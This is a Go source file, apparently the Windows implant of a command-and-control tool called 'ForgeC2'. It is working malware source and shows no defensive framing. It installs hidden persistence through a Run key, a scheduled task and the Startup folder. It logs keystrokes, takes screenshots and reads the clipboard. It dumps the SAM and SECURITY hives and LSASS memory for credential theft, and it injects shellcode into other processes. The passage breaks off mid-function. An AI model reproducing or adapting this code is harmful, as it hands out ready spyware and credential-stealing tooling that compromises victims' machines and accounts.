//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/Microsoft/go-winio"
)

// Windows API for pure Go screenshot (no external deps, no cgo)
var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")
	shcore = syscall.NewLazyDLL("shcore.dll")
	k32    = syscall.NewLazyDLL("kernel32.dll")
)

var (
	procGetDC                  = user32.NewProc("GetDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procGetSystemMetrics       = user32.NewProc("GetSystemMetrics")
	procSetProcessDPIAware     = user32.NewProc("SetProcessDPIAware")
	procSetProcessDpiAwareness = shcore.NewProc("SetProcessDpiAwareness")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procOutputDebugStringW     = k32.NewProc("OutputDebugStringW")
	procGetDeviceCaps          = gdi32.NewProc("GetDeviceCaps")

	// For process/thread suspend/resume (pause game etc)
	procCreateToolhelp32Snapshot = k32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = k32.NewProc("Process32FirstW")
	procProcess32Next            = k32.NewProc("Process32NextW")
	procThread32First            = k32.NewProc("Thread32First")
	procThread32Next             = k32.NewProc("Thread32Next")
	procOpenThread               = k32.NewProc("OpenThread")
	procSuspendThread            = k32.NewProc("SuspendThread")
	procResumeThread             = k32.NewProc("ResumeThread")
	procCloseHandle              = k32.NewProc("CloseHandle")
	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")

	// for killproc
	procOpenProcess              = k32.NewProc("OpenProcess")
	procTerminateProcess         = k32.NewProc("TerminateProcess")

	// for clipboard
	procOpenClipboard            = user32.NewProc("OpenClipboard")
	procCloseClipboard           = user32.NewProc("CloseClipboard")
	procGetClipboardData         = user32.NewProc("GetClipboardData")
	procSetClipboardData         = user32.NewProc("SetClipboardData")
	procEmptyClipboard           = user32.NewProc("EmptyClipboard")
	procGlobalLock               = k32.NewProc("GlobalLock")
	procGlobalUnlock             = k32.NewProc("GlobalUnlock")
	procGlobalAlloc              = k32.NewProc("GlobalAlloc")
	procGlobalFree               = k32.NewProc("GlobalFree")

	// for process injection (creds / lateral use shells too)
	procOpenProcessEx         = k32.NewProc("OpenProcess")
	procVirtualAllocEx        = k32.NewProc("VirtualAllocEx")
	procWriteProcessMemory    = k32.NewProc("WriteProcessMemory")
	procCreateRemoteThread    = k32.NewProc("CreateRemoteThread")
	procVirtualFreeEx         = k32.NewProc("VirtualFreeEx")
	procQueueUserAPC          = k32.NewProc("QueueUserAPC")
)

func debugLog(msg string) {
	if Debug {
		p, _ := syscall.UTF16PtrFromString("[ForgeC2] " + msg)
		procOutputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
		fmt.Println(msg)
	}
}

// getPlatformSecurityInfo returns (integrity level, isElevated, domain/workgroup)
func getPlatformSecurityInfo() (string, bool, string) {
	integrity := "Medium"
	elevated := false

	// Open process token via raw syscall
	var hToken uintptr
	currentProc, _ := syscall.GetCurrentProcess()
	ret, _, _ := procOpenProcessToken.Call(
		uintptr(currentProc),
		0x0008, // TOKEN_QUERY
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret != 0 && hToken != 0 {
		defer syscall.CloseHandle(syscall.Handle(hToken))

		// GetTokenInformation with TokenIntegrityLevel (class 25)
		var needed uint32
		procGetTokenInformation.Call(hToken, 25, 0, 0, uintptr(unsafe.Pointer(&needed)))
		if needed > 0 {
			buf := make([]byte, needed)
			ret2, _, _ := procGetTokenInformation.Call(
				hToken, 25,
				uintptr(unsafe.Pointer(&buf[0])),
				uintptr(needed),
				uintptr(unsafe.Pointer(&needed)),
			)
			if ret2 != 0 && len(buf) >= 8 {
				// TOKEN_MANDATORY_LABEL: Label.Sid (pointer) + Label.Attributes
				sidPtr := *(*uintptr)(unsafe.Pointer(&buf[0]))
				if sidPtr != 0 {
					// SubAuthorityCount at offset 1 of SID
					subCount := *(*uint8)(unsafe.Pointer(sidPtr + 1))
					if subCount > 0 {
						// Last sub-authority RID at offset 8 + (count-1)*4
						rid := *(*uint32)(unsafe.Pointer(sidPtr + 8 + uintptr(subCount-1)*4))
						switch {
						case rid >= 16384:
							integrity = "System"
							elevated = true
						case rid >= 12288:
							integrity = "High"
							elevated = true
						case rid >= 8192:
							integrity = "Medium"
						case rid >= 4096:
							integrity = "Low"
						default:
							integrity = "Untrusted"
						}
					}
				}
			}
		}
	}

	domain := os.Getenv("USERDOMAIN")
	if domain == "" {
		domain, _ = os.Hostname()
	}
	return integrity, elevated, domain
}

const (
	// System metrics
	SM_XVIRTUALSCREEN  = 76
	SM_YVIRTUALSCREEN  = 77
	SM_CXVIRTUALSCREEN = 78
	SM_CYVIRTUALSCREEN = 79
	SM_CXSCREEN        = 0
	SM_CYSCREEN        = 1

	// GDI
	SRCCOPY    = 0x00CC0020
	CAPTUREBLT = 0x40000000

	BI_RGB         = 0
	DIB_RGB_COLORS = 0

	LOGPIXELSX = 88

	// Process / Thread snapshot
	TH32CS_SNAPPROCESS = 0x00000002
	TH32CS_SNAPTHREAD  = 0x00000004
	THREAD_SUSPEND_RESUME = 0x0002
	PROCESS_TERMINATE     = 0x0001
	PROCESS_QUERY_INFORMATION = 0x0400
	MAX_PATH           = 260
	CF_TEXT            = 1
	GMEM_MOVEABLE      = 0x0002

	// injection constants
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	PROCESS_ALL_ACCESS        = 0x1F0FFF
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
)

type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type threadEntry32 struct {
	dwSize             uint32
	cntUsage           uint32
	th32ThreadID       uint32
	th32OwnerProcessID uint32
	tpBasePri          int32
	tpDeltaPri         int32
	dwFlags            uint32
}

// bitmapInfoHeader matches Windows BITMAPINFOHEADER
type bitmapInfoHeader struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

type bitmapInfo struct {
	bmiHeader bitmapInfoHeader
}

func setDPIAware() {
	// Prefer per-monitor awareness v2 if available
	ret, _, _ := procSetProcessDpiAwareness.Call(uintptr(2))
	if ret != 0 {
		// fallback
		procSetProcessDPIAware.Call()
	}
	debugLog("DPI awareness set")
}

func getSystemMetrics(nIndex int32) int32 {
	ret, _, _ := procGetSystemMetrics.Call(uintptr(nIndex))
	return int32(ret)
}

func getDC(hwnd uintptr) uintptr {
	ret, _, _ := procGetDC.Call(hwnd)
	return ret
}

func releaseDC(hwnd, hdc uintptr) {
	procReleaseDC.Call(hwnd, hdc)
}

func getDeviceCaps(hdc uintptr, index int32) int32 {
	ret, _, _ := procGetDeviceCaps.Call(hdc, uintptr(index))
	return int32(ret)
}

func createCompatibleDC(hdc uintptr) uintptr {
	ret, _, _ := procCreateCompatibleDC.Call(hdc)
	return ret
}

func createCompatibleBitmap(hdc uintptr, w, h int32) uintptr {
	ret, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	return ret
}

func selectObject(hdc, obj uintptr) uintptr {
	ret, _, _ := procSelectObject.Call(hdc, obj)
	return ret
}

func bitBlt(hdcDest uintptr, x, y, w, h int32, hdcSrc uintptr, xSrc, ySrc int32, rop uint32) bool {
	ret, _, _ := procBitBlt.Call(
		hdcDest,
		uintptr(x), uintptr(y), uintptr(w), uintptr(h),
		hdcSrc,
		uintptr(xSrc), uintptr(ySrc),
		uintptr(rop),
	)
	return ret != 0
}

func getDIBits(hdc, hbmp uintptr, startScan, scanLines int32, bits unsafe.Pointer, bi *bitmapInfo, usage uint32) int32 {
	ret, _, _ := procGetDIBits.Call(
		hdc,
		hbmp,
		uintptr(startScan),
		uintptr(scanLines),
		uintptr(bits),
		uintptr(unsafe.Pointer(bi)),
		uintptr(usage),
	)
	return int32(ret)
}

func deleteDC(hdc uintptr) {
	procDeleteDC.Call(hdc)
}

func deleteObject(obj uintptr) {
	procDeleteObject.Call(obj)
}

func getVirtualScreen() (x, y, w, h int32) {
	x = getSystemMetrics(SM_XVIRTUALSCREEN)
	y = getSystemMetrics(SM_YVIRTUALSCREEN)
	w = getSystemMetrics(SM_CXVIRTUALSCREEN)
	h = getSystemMetrics(SM_CYVIRTUALSCREEN)
	if w <= 0 {
		w = getSystemMetrics(SM_CXSCREEN)
	}
	if h <= 0 {
		h = getSystemMetrics(SM_CYSCREEN)
	}
	return
}

// applyHideWindow sets hidden window attr for exec on Windows (called only from windows code path)
func applyHideWindow(cmd *exec.Cmd) {
	if cmd != nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}
}

// addPersistenceWindows does robust user-level persistence for Windows.
// Copies the binary to %APPDATA%\ForgeC2\forgec2.exe (stable location even if original is deleted).
// Registers multiple auto-start methods (much stronger than single HKCU Run):
// 1. HKCU\...\Run key
// 2. Scheduled Task (schtasks /sc onlogon)
// 3. Startup folder
// Also sets hidden attribute.
func addPersistenceWindows() {
	srcPath, err := os.Executable()
	if err != nil {
		if Debug {
			fmt.Printf("[persist] failed to get exe path: %v\n", err)
		}
		return
	}

	// Stable drop location: %APPDATA%\ForgeC2\forgec2.exe
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = os.Getenv("LOCALAPPDATA")
	}
	if appData == "" {
		appData = os.TempDir()
	}
	persistDir := filepath.Join(appData, "ForgeC2")
	if err := os.MkdirAll(persistDir, 0755); err != nil {
		if Debug {
			fmt.Printf("[persist] mkdir failed: %v\n", err)
		}
		return
	}

	dstPath := filepath.Join(persistDir, "forgec2.exe")

	// Copy binary if not present or if source is newer (simple check)
	needCopy := true
	if dstInfo, err := os.Stat(dstPath); err == nil {
		if srcInfo, err := os.Stat(srcPath); err == nil {
			if dstInfo.ModTime().After(srcInfo.ModTime()) || dstInfo.Size() == srcInfo.Size() {
				needCopy = false
			}
		}
	}

	if needCopy {
		src, err := os.Open(srcPath)
		if err != nil {
			if Debug { fmt.Printf("[persist] open src failed: %v\n", err) }
			return
		}
		defer src.Close()

		dst, err := os.Create(dstPath)
		if err != nil {
			if Debug { fmt.Printf("[persist] create dst failed: %v\n", err) }
			return
		}
		_, err = io.Copy(dst, src)
		dst.Close()
		if err != nil {
			if Debug { fmt.Printf("[persist] copy failed: %v\n", err) }
			return
		}

		// Try to hide the file
		setHidden(dstPath)
		if Debug {
			fmt.Printf("[persist] copied to %s\n", dstPath)
		}
	}

	// 1. HKCU Run key (classic)
	regCmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "ForgeC2", "/t", "REG_SZ", "/d", dstPath, "/f")
	applyHideWindow(regCmd)
	regOut, regErr := regCmd.CombinedOutput()
	if Debug {
		if regErr != nil {
			fmt.Printf("[persist] HKCU Run failed: %v %s\n", regErr, string(regOut))
		} else {
			fmt.Printf("[persist] HKCU Run registered\n")
		}
	}

	// 2. Scheduled Task (on user logon) - very reliable
	taskName := "ForgeC2"
	schtasks := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", dstPath, "/sc", "onlogon", "/f", "/it")
	applyHideWindow(schtasks)
	taskOut, taskErr := schtasks.CombinedOutput()
	if Debug {
		if taskErr != nil {
			fmt.Printf("[persist] schtasks failed: %v %s\n", taskErr, string(taskOut))
		} else {
			fmt.Printf("[persist] scheduled task created\n")
		}
	}

	// 3. Startup folder (direct exe copy - works without registry)
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	os.MkdirAll(startupDir, 0755)
	startupPath := filepath.Join(startupDir, "forgec2.exe")
	if _, err := os.Stat(startupPath); os.IsNotExist(err) {
		// copy again or symlink, simple copy
		if src, err := os.Open(dstPath); err == nil {
			if dst, err := os.Create(startupPath); err == nil {
				io.Copy(dst, src)
				dst.Close()
				setHidden(startupPath)
			}
			src.Close()
		}
	}
	if Debug {
		fmt.Printf("[persist] startup folder persistence attempted: %s\n", startupPath)
	}
}

func setHidden(path string) {
	p, _ := syscall.UTF16PtrFromString(path)
	procSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), 0x2) // FILE_ATTRIBUTE_HIDDEN
}

// captureScreenRGBA captures the full virtual screen as RGBA image.
// We rely on setDPIAware() (called early) so that GetSystemMetrics returns
// the actual physical resolution even on high-DPI setups. No extra scaling
// is applied here anymore.
func captureScreenRGBA() (*image.RGBA, error) {
	setDPIAware()

	x, y, w, h := getVirtualScreen()
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid virtual screen dimensions: %dx%d", w, h)
	}

	debugLog(fmt.Sprintf("virtual screen raw: x=%d y=%d w=%d h=%d", x, y, w, h))

	hdc := getDC(0)
	if hdc == 0 {
		return nil, fmt.Errorf("GetDC failed")
	}
	defer releaseDC(0, hdc)

	// Note: because we call setDPIAware() early (in init), GetSystemMetrics
	// already returns physical pixel dimensions on high-DPI displays.
	// We no longer multiply by extra DPI scale here to avoid over-scaling
	// (which was causing partial captures or wrong sizes in some cases).
	dpiX := getDeviceCaps(hdc, LOGPIXELSX)
	debugLog(fmt.Sprintf("DPI: %d, using virtual screen %dx%d", dpiX, w, h))

	hdcMem := createCompatibleDC(hdc)
	if hdcMem == 0 {
		return nil, fmt.Errorf("CreateCompatibleDC failed")
	}
	defer deleteDC(hdcMem)

	hbm := createCompatibleBitmap(hdc, w, h)
	if hbm == 0 {
		return nil, fmt.Errorf("CreateCompatibleBitmap failed")
	}
	defer deleteObject(hbm)

	oldObj := selectObject(hdcMem, hbm)
	defer selectObject(hdcMem, oldObj)

	// Capture including layered windows
	if !bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY|CAPTUREBLT) {
		// try without CAPTUREBLT as fallback
		bitBlt(hdcMem, 0, 0, w, h, hdc, x, y, SRCCOPY)
	}

	var bi bitmapInfo
	bi.bmiHeader.biSize = uint32(unsafe.Sizeof(bi.bmiHeader))
	bi.bmiHeader.biWidth = w
	bi.bmiHeader.biHeight = -h // negative for top-down DIB
	bi.bmiHeader.biPlanes = 1
	bi.bmiHeader.biBitCount = 32
	bi.bmiHeader.biCompression = BI_RGB
	// biSizeImage left 0; GDI will compute

	pixBuf := make([]byte, int64(w)*int64(h)*4)

	lines := getDIBits(hdcMem, hbm, 0, h, unsafe.Pointer(&pixBuf[0]), &bi, DIB_RGB_COLORS)
	if lines <= 0 {
		return nil, fmt.Errorf("GetDIBits returned %d", lines)
	}

	// BGRA -> RGBA in place
	for i := 0; i < len(pixBuf); i += 4 {
		pixBuf[i], pixBuf[i+2] = pixBuf[i+2], pixBuf[i] // B <-> R
		// alpha channel pixBuf[i+3] usually 0 or undefined -> set 255 for opaque
		pixBuf[i+3] = 0xff
	}

	debugLog(fmt.Sprintf("screenshot captured %dx%d (%d bytes)", w, h, len(pixBuf)))

	return &image.RGBA{
		Pix:    pixBuf,
		Stride: int(w) * 4,
		Rect:   image.Rect(0, 0, int(w), int(h)),
	}, nil
}

// --- Keylogger (Windows) ---

var procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")

func getAsyncKeyState(vk int32) uint16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return uint16(ret)
}

// vkToString converts a virtual key code + modifiers into a human readable token.
func vkToString(vk int, shift bool) string {
	switch vk {
	case 0x08:
		return "[Backspace]"
	case 0x09:
		return "[Tab]"
	case 0x0D:
		return "[Enter]\n"
	case 0x1B:
		return "[Esc]"
	case 0x20:
		return " "
	case 0x2E:
		return "[Del]"
	case 0x25:
		return "[Left]"
	case 0x26:
		return "[Up]"
	case 0x27:
		return "[Right]"
	case 0x28:
		return "[Down]"
	case 0x5B, 0x5C:
		return "[Win]"
	}

	// Letters
	if vk >= 0x41 && vk <= 0x5A {
		if shift {
			return string(rune(vk))
		}
		return string(rune(vk + 0x20))
	}

	// Numbers top row
	if vk >= 0x30 && vk <= 0x39 {
		if shift {
			shiftMap := map[int]string{0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^", 0x37: "&", 0x38: "*", 0x39: "("}
			if s, ok := shiftMap[vk]; ok {
				return s
			}
		}
		return string(rune(vk))
	}

	// Common punctuation / symbols
	if shift {
		shiftPunct := map[int]string{
			0xBA: ":", 0xBB: "+", 0xBC: "<", 0xBD: "_", 0xBE: ">", 0xBF: "?",
			0xC0: "~", 0xDB: "{", 0xDC: "|", 0xDD: "}", 0xDE: "\"",
		}
		if s, ok := shiftPunct[vk]; ok {
			return s
		}
	} else {
		punct := map[int]string{
			0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
			0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
		}
		if s, ok := punct[vk]; ok {
			return s
		}
	}

	// F-keys etc
	if vk >= 0x70 && vk <= 0x7B {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	return fmt.Sprintf("[0x%02X]", vk)
}

func keyloggerLoop() {
	debugLog("keylogger goroutine started")
	var prev [256]uint16
	for keylogActive {
		for vk := 0; vk < 256; vk++ {
			state := getAsyncKeyState(int32(vk))
			// high bit set = currently down
			if (state&0x8000) != 0 && (prev[vk]&0x8000) == 0 {
				shift := (getAsyncKeyState(0x10) & 0x8000) != 0 // VK_SHIFT
				ch := vkToString(vk, shift)
				keylogMu.Lock()
				keylogBuffer.WriteString(ch)
				keylogMu.Unlock()
			}
			prev[vk] = state
		}
		time.Sleep(12 * time.Millisecond) // balance responsiveness / CPU
	}
	debugLog("keylogger goroutine stopped")
}

// --- Process suspend/resume (pause game/process) ---

func findPIDByName(name string) (uint32, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == 0 {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var pe processEntry32
	pe.dwSize = uint32(unsafe.Sizeof(pe))

	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&pe)))
	for ret != 0 {
		exe := syscall.UTF16ToString(pe.szExeFile[:])
		if strings.EqualFold(exe, name) || strings.EqualFold(filepath.Base(exe), name) {
			return pe.th32ProcessID, nil
		}
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return 0, fmt.Errorf("process not found: %s", name)
}

func suspendProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return "", fmt.Errorf("snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))

	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	count := 0
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			h, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME, 0, uintptr(te.th32ThreadID))
			if h != 0 {
				procSuspendThread.Call(h)
				procCloseHandle.Call(h)
				count++
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Sprintf("suspended %d threads (pid=%d)", count, pid), nil
}

func resumeProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return "", fmt.Errorf("snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))

	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	count := 0
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			h, _, _ := procOpenThread.Call(THREAD_SUSPEND_RESUME, 0, uintptr(te.th32ThreadID))
			if h != 0 {
				procResumeThread.Call(h)
				procCloseHandle.Call(h)
				count++
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return fmt.Sprintf("resumed %d threads (pid=%d)", count, pid), nil
}

// --- Additional small features ---

func killProcessWindows(target string) (string, error) {
	var pid uint32
	if p, err := strconv.ParseUint(target, 10, 32); err == nil {
		pid = uint32(p)
	} else {
		p, err := findPIDByName(target)
		if err != nil {
			return "", err
		}
		pid = p
	}

	h, _, _ := procOpenProcess.Call(PROCESS_TERMINATE, 0, uintptr(pid))
	if h == 0 {
		return "", fmt.Errorf("open process failed")
	}
	defer procCloseHandle.Call(h)

	ret, _, _ := procTerminateProcess.Call(h, 1)
	if ret == 0 {
		return "", fmt.Errorf("terminate failed")
	}
	return fmt.Sprintf("killed pid %d", pid), nil
}

func clipboardGetWindows() (string, error) {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	h, _, _ := procGetClipboardData.Call(CF_TEXT)
	if h == 0 {
		return "", fmt.Errorf("get clipboard data failed (maybe not text)")
	}

	ptr, _, _ := procGlobalLock.Call(h)
	if ptr == 0 {
		return "", fmt.Errorf("global lock failed")
	}
	defer procGlobalUnlock.Call(h)

	// CF_TEXT is ANSI bytes
	return string((*[1 << 20]byte)(unsafe.Pointer(ptr))[:]), nil
}

func clipboardSetWindows(data string) error {
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("open clipboard failed")
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	// allocate global memory
	size := len(data) + 1
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("global alloc failed")
	}

	ptr, _, _ := procGlobalLock.Call(hMem)
	if ptr != 0 {
		copy((*[1 << 20]byte)(unsafe.Pointer(ptr))[:], []byte(data))
		procGlobalUnlock.Call(hMem)
	}

	procSetClipboardData.Call(CF_TEXT, hMem)
	return nil
}

// Registry using reg.exe for simplicity and reliability (no extra deps)
func regGetWindows(key string) (string, error) {
	cmd := exec.Command("reg", "query", key, "/s")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("reg query failed: %s", string(out))
	}
	return string(out), nil
}

func regSetWindows(path, data string) error {
	// data format: "REG_SZ|value" or "REG_DWORD|123"
	parts := strings.SplitN(data, "|", 2)
	if len(parts) != 2 {
		return fmt.Errorf("data format: TYPE|value e.g. REG_SZ|hello")
	}
	typ := parts[0]
	val := parts[1]

	cmd := exec.Command("reg", "add", path, "/ve", "/t", typ, "/d", val, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add failed: %s", string(out))
	}
	return nil
}

func regDeleteWindows(key string) error {
	cmd := exec.Command("reg", "delete", key, "/f")
	applyHideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg delete failed: %s", string(out))
	}
	return nil
}

// --- Creds dump (3) ---

func dumpCreds() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("creds only on windows")
	}
	var out strings.Builder
	out.WriteString("=== Credential Dump Attempt ===\n")

	// 1. Reg save for offline attack (SAM/SYSTEM/SECURITY)
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = "C:\\Windows\\Temp"
	}
	samPath := filepath.Join(tmp, "sam.save")
	sysPath := filepath.Join(tmp, "system.save")
	secPath := filepath.Join(tmp, "security.save")

	// Need admin usually
	cmds := []struct{ name, c string }{
		{"SAM", fmt.Sprintf(`reg save HKLM\SAM "%s" /y`, samPath)},
		{"SYSTEM", fmt.Sprintf(`reg save HKLM\SYSTEM "%s" /y`, sysPath)},
		{"SECURITY", fmt.Sprintf(`reg save HKLM\SECURITY "%s" /y`, secPath)},
	}
	for _, c := range cmds {
		rcmd := exec.Command("cmd", "/c", c.c)
		applyHideWindow(rcmd)
		if r, err := rcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] %s saved: %s\n", c.name, c.c))
		} else {
			out.WriteString(fmt.Sprintf("[-] %s failed: %v %s\n", c.name, err, string(r)))
		}
	}

	// 2. LSASS minidump via comsvcs.dll (classic, works from high integrity often)
	// Find lsass pid
	lsassPID := uint32(0)
	if p, err := findPIDByName("lsass.exe"); err == nil {
		lsassPID = p
	} else {
		// fallback via tasklist
		tcmd := exec.Command("cmd", "/c", "for /f \"tokens=2\" %i in ('tasklist /fi \"imagename eq lsass.exe\" /nh') do @echo %i")
		applyHideWindow(tcmd)
		if t, _ := tcmd.Output(); len(t) > 0 {
			if pid, _ := strconv.ParseUint(strings.TrimSpace(string(t)), 10, 32); pid > 0 {
				lsassPID = uint32(pid)
			}
		}
	}
	if lsassPID > 0 {
		dumpPath := filepath.Join(tmp, "lsass.dmp")
		// rundll32 comsvcs MiniDump (pid) (dumpfile) full
		dcmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll, MiniDump", fmt.Sprintf("%d", lsassPID), dumpPath, "full")
		applyHideWindow(dcmd)
		if d, err := dcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] LSASS minidump: %s (pid=%d)\n", dumpPath, lsassPID))
			// Optionally include size info; do not b64 entire dump here (too big). User downloads.
			if fi, err := os.Stat(dumpPath); err == nil {
				out.WriteString(fmt.Sprintf("    size=%d bytes\n", fi.Size()))
			}
		} else {
			out.WriteString(fmt.Sprintf("[-] LSASS dump failed (often requires admin/SeDebug): %v %s\n", err, string(d)))
		}
	} else {
		out.WriteString("[-] Could not locate lsass pid\n")
	}

	out.WriteString("\nFiles written to %TEMP% (use 'download' task or exfil):\n")
	out.WriteString("  - sam.save / system.save / security.save\n")
	out.WriteString("  - lsass.dmp (feed to mimikatz: sekurlsa::minidump + sekurlsa::logonpasswords)\n")
	out.WriteString("Note: run from high integrity / SYSTEM for best results.\n")
	return out.String(), nil
}

// --- Inject (4) multiple techniques ---

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	tech = strings.ToLower(strings.TrimSpace(tech))
	if tech == "" {
		tech = "createremotethread"
	}

	// Open target with necessary rights
	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		// try all access
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess failed for pid %d (check privs)", pid)
	}
	defer procCloseHandle.Call(hProc)

	switch tech {
	case "createremotethread", "crt", "remote":
		return doCreateRemoteThread(hProc, shellcode)
	case "apc", "queueapc":
		return doQueueUserAPC(hProc, pid, shellcode)
	case "earlybird":
		return doEarlyBird(hProc, pid, shellcode) // simplified variant
	default:
		// fallback
		return doCreateRemoteThread(hProc, shellcode)
	}
}

func doCreateRemoteThread(hProc uintptr, sc []byte) error {
	// VirtualAllocEx
	addr, _, _ := procVirtualAllocEx.Call(
		hProc,
		0,
		uintptr(len(sc)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	// WriteProcessMemory
	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProc,
		addr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed")
	}

	// CreateRemoteThread
	thread, _, _ := procCreateRemoteThread.Call(
		hProc,
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if thread == 0 {
		return fmt.Errorf("CreateRemoteThread failed")
	}
	procCloseHandle.Call(thread)
	return nil
}

func doQueueUserAPC(hProc uintptr, pid uint32, sc []byte) error {
	// Allocate + write in target
	addr, _, _ := procVirtualAllocEx.Call(hProc, 0, uintptr(len(sc)), uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_EXECUTE_READWRITE))
	if addr == 0 {
		return fmt.Errorf("alloc failed")
	}
	var w uintptr
